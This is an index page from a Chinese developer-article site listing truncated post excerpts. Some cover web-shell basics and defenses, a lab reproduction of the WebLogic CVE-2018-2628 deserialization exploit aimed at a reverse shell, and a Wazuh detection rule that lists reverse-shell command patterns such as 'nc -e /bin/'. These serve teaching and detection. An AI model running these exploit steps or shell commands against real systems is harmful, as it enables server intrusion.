<!doctype html>
<html lang="en-us">
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">


    <title>Posts | 开发者问答集锦</title>
    <meta property="og:title" content="Posts - 开发者问答集锦">
    <meta property="og:type" content="article">
        
        
    <meta name="Keywords" content="">
    <meta name="description" content="Posts">
        
    <meta name="author" content="">
    <meta property="og:url" content="https://zaina.newban.cn/posts/">
    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">

    <link rel="stylesheet" href='/css/normalize.css'>
    <link rel="stylesheet" href='/css/style.css'>
    <link rel="alternate" type="application/rss+xml+xml" href="https://zaina.newban.cn/posts/index.xml" title="开发者问答集锦" />
    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>

    
    
    
    
    
    
</head>


<body>
    <header id="header" class="clearfix">
    <div class="container">
        <div class="col-group">
            <div class="site-name ">
                
                    <a id="logo" href="https://zaina.newban.cn">
                        开发者问答集锦
                    </a>
                
                
            </div>
            <div>
                <nav id="nav-menu" class="clearfix">
                    <a class="" href="https://zaina.newban.cn">首页</a>
                    
                </nav>
            </div>
        </div>
    </div>
</header>

    <div id="body">
        <div class="container">
            <div class="col-group">

                <div class="col-8" id="main">
                    
<div class="res-cons">
    
    
    <article class="post">
        <header>
            <h1 class="post-title">
                <a href="https://zaina.newban.cn/posts/webshell%E7%AE%80%E4%BB%8B/" title="WebShell简介">WebShell简介</a>
            </h1>
        </header>
        <date class="post-meta meta-date">
            2020年9月2日
        </date>
        
        <div class="post-content">
            Web-Shell 简介 Web-Shell是一种可以将其上传到web服务器的脚本文件，实现远程控制服务器。
攻击者可以利用SQL注入、远程文件包含(remote file inclusion, RFI)、FTP等常见漏洞，甚至可以使用跨站点脚本(cross- site scripting, XSS)作为社会工程攻击的一部分，上传恶意Web-Shell脚本。Web- Shell本身并不能利用远程漏洞实施攻击，它总是攻击成功后的第二步(这个阶段也称为post-exploitation)。
Web-Shell可以用目标web服务器支持的任何语言编写。最常见的如PHP和ASP、Perl、Ruby、Python和Unix shell脚本。
比较常见的Web-Shell有 China Chopper, WSO, C99 and B374K等。
为什么使用Web-Shells ?  持久的远程访问：Web-Shell通常包含一个后门，允许攻击者远程访问并控制服务器，这将为攻击者省去在每次访问受攻击服务器时都需要利用漏洞的不便。
 特权升级: 攻击者可以通过利用系统上的本地漏洞来执行特权升级攻击，从而获得最高权限。
 用作中继点，转向入侵网络内其它主机。攻击者可能希望监视(嗅探)系统上的网络流量，扫描内部网络以发现活动主机，枚举网络中的防火墙和路由器。
 作为僵尸网络中的bot使用，向其它外部网络发起攻击。这为攻击者增加了额外的“匿名”层，因为他们使用第三方系统来发起攻击。
  安装Web-Shell的方式 Web-Shell可以通过许多Web应用程序漏洞或配置缺陷进行安装，如:
 跨站点脚本（XSS） SQL注入 应用或服务的漏洞(例如、WordPress或其他CMS应用程序) 文件处理漏洞(例如，上传过滤或分配权限) Remote File Include (RFI) 和 Local File Include (LFI)漏洞 公开的管理接口  如何检测Web-Shell 以下现象表示是你的系统可能已被Web-Shell感染：
 网站非正常时间的高使用率（由于潜在的上传和下载活动） 具有不寻常的时间戳的文件(例如，比安装的web应用程序最近更新的文件) 在外网可访问的地方(网络根目录)存在可疑文件 文件包含可疑关键字引用，如exe或eval 日志中发现意外网络连接。例如: 文件发起异常的网络请求(例如，JPG文件使用POST参数发出请求)，或从内部子网到DMZ服务器的可疑登录，反之亦然 web服务器进程执行的可疑shell命令(如目录遍历)  如何防御Web-Shell Web-Shell的安装通常是通过web应用程序漏洞或配置错误实现的。因此，识别和关闭这些漏洞对于避免潜在的危害至关重要。以下提供了些预防Web- Shell的最佳实践:
 定期更新应用程序和主机操作系统，以确保对已知漏洞的保护 在web服务器上实现最小权限原则: 降低攻击者升级特权或横向转向其他主机的能力 在面向Internet的系统和企业内部网络之间部署非军事区(DMZ)，限制两者之间的交互以及记录进出流量 确保web服务器的正确配置，包括禁用或阻塞所有不必要的服务和端口，白名单，阻止外部访问管理界面，不使用默认密码登录 利用反向代理(如mod_security)限制可访问的URL路径 用户输入验证来限制remote file inclusion和remote file inclusion漏洞 定期对系统和应用程序进行漏洞扫描 部署web应用程序防火墙（WAF）  https://www.……
        </div>
        <p class="readmore"><a href="https://zaina.newban.cn/posts/webshell%E7%AE%80%E4%BB%8B/">阅读全文</a></p>
    </article>
    
    
    
    <article class="post">
        <header>
            <h1 class="post-title">
                <a href="https://zaina.newban.cn/posts/webshellwebshellisawebbasedsshshellfortheiphonegoogleprojecthosting/" title="webshellWebShellisawebbasedsshshellfortheiPhoneGoogleProjectHosting">webshellWebShellisawebbasedsshshellfortheiPhoneGoogleProjectHosting</a>
            </h1>
        </header>
        <date class="post-meta meta-date">
            2020年9月2日
        </date>
        
        <div class="post-content">
            ……
        </div>
        <p class="readmore"><a href="https://zaina.newban.cn/posts/webshellwebshellisawebbasedsshshellfortheiphonegoogleprojecthosting/">阅读全文</a></p>
    </article>
    
    
    
    <article class="post">
        <header>
            <h1 class="post-title">
                <a href="https://zaina.newban.cn/posts/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve20182628%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BC%B9shell/" title="Weblogic反序列化漏洞CVE20182628实现反弹shell">Weblogic反序列化漏洞CVE20182628实现反弹shell</a>
            </h1>
        </header>
        <date class="post-meta meta-date">
            2020年9月2日
        </date>
        
        <div class="post-content">
            Weblogic反序列化漏洞（CVE-2018-2628）反弹shell 技术无罪，请勿用于恶意用途
转载请注明出处!
看见大部分复现教程都是弹计算器，创建文件夹，对于一些人来说不能满足需求，所以我准备做一个反弹shell的复现。
测试机:MacBook-Air
测试机IP:192.168.0.100
靶机IP:192.168.0.100:7001
环境: docker
工具：CVE-2018-2628漏洞利用工具包 下载
一. 环境搭建
将环境vulhub的环境git到本地
git clone https://github.com/vulhub/vulhub.git  接着 cd weblogic/CVE-2018-2628

输入docker-compose up -d 启动
docker-compose up -d  
启动后访问页面192.168.0.100:7001

出现这个页面说明已经成功了
二. 漏洞测试
使用nmap进行扫描
nmap -n -v -p7001,7002 192.168.0.100 --script=weblogic-t3-info  
结果显示开启了T3协议
下载 CVE-2018-2628漏洞利用工具包

修改url.txt 将里面的IP 改成目标IP

python CVE-2018-2628-MultiThreading.py  
出现 is vul CVE-2018-2628 说明漏洞存在
三. 漏洞复现
启动JRMP Server：
java -cp ysoserial-0.1-cve-2018-2628-all.jar ysoserial.……
        </div>
        <p class="readmore"><a href="https://zaina.newban.cn/posts/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve20182628%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BC%B9shell/">阅读全文</a></p>
    </article>
    
    
    
    <article class="post">
        <header>
            <h1 class="post-title">
                <a href="https://zaina.newban.cn/posts/webdrivertestng%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97javarubynet%E7%89%88/" title="WebDriverTestNg学习日志JavaRubyNet版">WebDriverTestNg学习日志JavaRubyNet版</a>
            </h1>
        </header>
        <date class="post-meta meta-date">
            2020年9月2日
        </date>
        
        <div class="post-content">
            目录
WebDriver(JAVA)拾级而上
WebDriver拾级而上·之零 WebDriver理论
WebDriver拾级而上·之一 环境部署
WebDriver拾级而上·之二 浏览器操作
WebDriver拾级而上·之三 定位页面元素
WebDriver拾级而上·之四 操作页面元素
WebDriver拾级而上·之五 iframe的处理
WebDriver拾级而上·之六 获得弹出窗
WebDriver拾级而上·之七 处理对话框
WebDriver拾级而上·之八 操作cookies
WebDriver拾级而上·之九 等待页面元素加载
WebDriver拾级而上·之十 封装与重用
WebDriver拾级而上·之十一 在selenium2.0中使用selenium1.0的API
WebDriver拾级而上·之十二 利用selenium-webdriver截图
WebDriver拾级而上·之十三 调用Java Script
WebDriver拾级而上·之十四 RemoteWebDriver
WebDriver拾级而上·之十五 拖曳动作模拟
WebDriver拾级而上·之十六 Table控件的处理
WebDriver拾级而上·之十七 断言
WebDriver拾级而上·之十八 设置元素焦点
WebDriver拾级而上·之十九 常用方法
TestNG深入
TestNG·一 基础概念
TestNG·二 测试组
TestNG·三 测试方法
TestNG·四 测试方法之工厂
TestNG·五 运行TestNG
TestNG·六 测试结果
TestNG·七 annotation
TestNG·八 并发测试
TestNG·九 使用testng-xslt改写testng的测试报告
TestNG·十 自定义日志记录
TestNG·十一 TestNG报告API
JUnit
JUnit4单元测试
WebDriver(Ruby)拾级而上……
        </div>
        <p class="readmore"><a href="https://zaina.newban.cn/posts/webdrivertestng%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97javarubynet%E7%89%88/">阅读全文</a></p>
    </article>
    
    
    
    <article class="post">
        <header>
            <h1 class="post-title">
                <a href="https://zaina.newban.cn/posts/wdcp%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAshell%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90installsh/" title="wdcp的环境搭建shell脚本分析installsh">wdcp的环境搭建shell脚本分析installsh</a>
            </h1>
        </header>
        <date class="post-meta meta-date">
            2020年9月2日
        </date>
        
        <div class="post-content">
            ……
        </div>
        <p class="readmore"><a href="https://zaina.newban.cn/posts/wdcp%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAshell%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90installsh/">阅读全文</a></p>
    </article>
    
    
    
    <article class="post">
        <header>
            <h1 class="post-title">
                <a href="https://zaina.newban.cn/posts/wazuh%E6%A3%80%E6%B5%8B%E5%8F%8D%E5%BC%B9shell/" title="Wazuh检测反弹shell">Wazuh检测反弹shell</a>
            </h1>
        </header>
        <date class="post-meta meta-date">
            2020年9月2日
        </date>
        
        <div class="post-content">
            Wazuh通过在agent服务器上执行指定的命令，并收集命令结果，可以在一定程度上发现反弹shell的入侵行为。
目前有2中常见的检测方法，一种是通过netstat输出网络连接中的shell进程来识别，另一种是通过ps输出进程信息中的反弹shell命令特征来识别。
1. 在agent的/var/ossec/etc/ossec.conf文件末尾增加自定义的命令，并重启
 command ps -eo user,pid,cmd 60 command netstat -anptl 60  2. 在wazuh-manager端修改/var/ossec/etc/rules/local_rules.xml，增加自定义规则，并重启
 530 ^ossec: output: 'ps -eo user,pid,cmd' List of running process. process_monitor, 100050 bash -i|dash -i|sh -i$|perl -e|perl -MIO -e|php -r|ruby -rsocket|xterm -display|Xnest |xhost |nc -e /bin/|lua -e require|python -c import socket|python -c import subprocess|python -c import os|python -c exec Reverse shell listening for incoming connections. process_monitor,attacks 530 ^ossec: output: 'netstat -anptl' List of listening tcp ports.……
        </div>
        <p class="readmore"><a href="https://zaina.newban.cn/posts/wazuh%E6%A3%80%E6%B5%8B%E5%8F%8D%E5%BC%B9shell/">阅读全文</a></p>
    </article>
    
    
    
    <article class="post">
        <header>
            <h1 class="post-title">
                <a href="https://zaina.newban.cn/posts/watirruby%E7%AC%AC%E4%B8%80%E8%AE%B2%E5%AE%89%E8%A3%85%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BDwindows%E4%B8%8Blinux%E4%B8%8B%E8%AF%B7%E7%94%A8watirwebdriver/" title="watirruby第一讲安装文件下载windows下linux下请用watirwebdriver">watirruby第一讲安装文件下载windows下linux下请用watirwebdriver</a>
            </h1>
        </header>
        <date class="post-meta meta-date">
            2020年9月2日
        </date>
        
        <div class="post-content">
            ……
        </div>
        <p class="readmore"><a href="https://zaina.newban.cn/posts/watirruby%E7%AC%AC%E4%B8%80%E8%AE%B2%E5%AE%89%E8%A3%85%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BDwindows%E4%B8%8Blinux%E4%B8%8B%E8%AF%B7%E7%94%A8watirwebdriver/">阅读全文</a></p>
    </article>
    
    
    
    <article class="post">
        <header>
            <h1 class="post-title">
                <a href="https://zaina.newban.cn/posts/watirruby%E7%9A%84%E5%BC%80%E6%BA%90web%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/" title="WatirRuby的开源Web自动化测试框架">WatirRuby的开源Web自动化测试框架</a>
            </h1>
        </header>
        <date class="post-meta meta-date">
            2020年9月2日
        </date>
        
        <div class="post-content">
            ……
        </div>
        <p class="readmore"><a href="https://zaina.newban.cn/posts/watirruby%E7%9A%84%E5%BC%80%E6%BA%90web%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/">阅读全文</a></p>
    </article>
    
    
    
    <article class="post">
        <header>
            <h1 class="post-title">
                <a href="https://zaina.newban.cn/posts/watirruby%E7%89%88%E6%9C%AC%E6%9F%A5%E7%9C%8B%E6%96%B9%E6%B3%95/" title="watirruby版本查看方法">watirruby版本查看方法</a>
            </h1>
        </header>
        <date class="post-meta meta-date">
            2020年9月2日
        </date>
        
        <div class="post-content">
            ……
        </div>
        <p class="readmore"><a href="https://zaina.newban.cn/posts/watirruby%E7%89%88%E6%9C%AC%E6%9F%A5%E7%9C%8B%E6%96%B9%E6%B3%95/">阅读全文</a></p>
    </article>
    
    
    
    <article class="post">
        <header>
            <h1 class="post-title">
                <a href="https://zaina.newban.cn/posts/warninglnk4089allreferencestoshell32dlldiscardedbyoptref/" title="warningLNK4089allreferencestoSHELL32dlldiscardedbyOPTREF">warningLNK4089allreferencestoSHELL32dlldiscardedbyOPTREF</a>
            </h1>
        </header>
        <date class="post-meta meta-date">
            2020年9月2日
        </date>
        
        <div class="post-content">
            ……
        </div>
        <p class="readmore"><a href="https://zaina.newban.cn/posts/warninglnk4089allreferencestoshell32dlldiscardedbyoptref/">阅读全文</a></p>
    </article>
    
    
    



<ol class="page-navigator">
    
    <li class="prev">
        <a href="https://zaina.newban.cn/posts/page/416/">上一页</a>
    </li>
    

    

    
        
        
    
    

    
        
        
        <li >
            <a href="https://zaina.newban.cn/posts/">1</a>
        </li>
        
    
        
        <li>
            <span>...</span>
        </li>
        
    
        
        
        <li >
            <a href="https://zaina.newban.cn/posts/page/415/">415</a>
        </li>
        
    
        
        
        <li >
            <a href="https://zaina.newban.cn/posts/page/416/">416</a>
        </li>
        
    
        
        
        <li  class="current">
            <a href="https://zaina.newban.cn/posts/page/417/">417</a>
        </li>
        
    
        
        
        <li >
            <a href="https://zaina.newban.cn/posts/page/418/">418</a>
        </li>
        
    
        
        
        <li >
            <a href="https://zaina.newban.cn/posts/page/419/">419</a>
        </li>
        
    
        
        <li>
            <span>...</span>
        </li>
        
    
        
        
        <li >
            <a href="https://zaina.newban.cn/posts/page/1960/">1960</a>
        </li>
        
    

    
    

    <li class="next">
        <a href="https://zaina.newban.cn/posts/page/418/">下一页</a>
    </li>
    
</ol>




</div>

                    <footer id="footer">
    <div>
        &copy; 2020 <a href="https://zaina.newban.cn">开发者问答集锦 By </a>
        
    </div>
    <br />
    <div>
        <div class="github-badge">
            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
        </div>
        <div class="github-badge">
            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
        </div>
        <div class="github-badge">
            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
        </div>
    </div>
</footer>



<a id="rocket" href="#top"></a>
<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>



    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>




                </div>

                <div id="secondary">
    <section class="widget">
        <form id="search" action='https://zaina.newban.cn/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
      
      <input type="text" name="q" maxlength="20" placeholder="Search">
      <input type="hidden" name="sitesearch" value="https://zaina.newban.cn">
      <button type="submit" class="submit icon-search"></button>
</form>
    </section>
    
    <section class="widget">
        <h3 class="widget-title">最近文章</h3>
<ul class="widget-list">
    
    <li>
        <a href="https://zaina.newban.cn/posts/001rubyruby%E4%B8%AD%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%8F%98%E9%87%8Fsymbol%E5%AF%B9%E6%AF%94/" title="001rubyRuby中全局变量实例变量局部变量类变量Symbol对比">001rubyRuby中全局变量实例变量局部变量类变量Symbol对比</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/" title="007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/" title="009Shell脚本下条件测试eqne">009Shell脚本下条件测试eqne</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/" title="00Pythonmanagepyshell和Python的分析">00Pythonmanagepyshell和Python的分析</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/" title="010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/018dockerfileshell/" title="018DockerfileSHELL">018DockerfileSHELL</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/01shell%E5%85%A5%E9%97%A801bashshell%E7%89%B9%E6%80%A7/" title="01Shell入门01bashShell特性">01Shell入门01bashShell特性</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/01shell%E5%8F%98%E9%87%8F/" title="01Shell变量">01Shell变量</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/01shell%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8Fbash%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD/" title="01Shell基础概述脚本执行方式Bash基本功能">01Shell基础概述脚本执行方式Bash基本功能</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/01shell%E7%BC%96%E7%A8%8Bhelloworld/" title="01shell编程helloworld">01shell编程helloworld</a>
    </li>
    
</ul>
    </section>

    

    <section class="widget">
        <h3 class="widget-title"><a href="/categories">分类</a></h3>
<ul class="widget-list">
    
</ul>
    </section>

    <section class="widget">
        <h3 class="widget-title"><a href="/tags">标签</a></h3>
<div class="tagcloud">
    
    <a href="https://zaina.newban.cn/tags/ruby/">ruby</a>
    
    <a href="https://zaina.newban.cn/tags/shell/">shell</a>
    
</div>
    </section>

    

    <section class="widget">
        <h3 class="widget-title">其它</h3>
        <ul class="widget-list">
            <li><a href="https://zaina.newban.cn/index.xml">文章 RSS</a></li>
        </ul>
    </section>
</div>
            </div>
        </div>
    </div>
</body>

</html>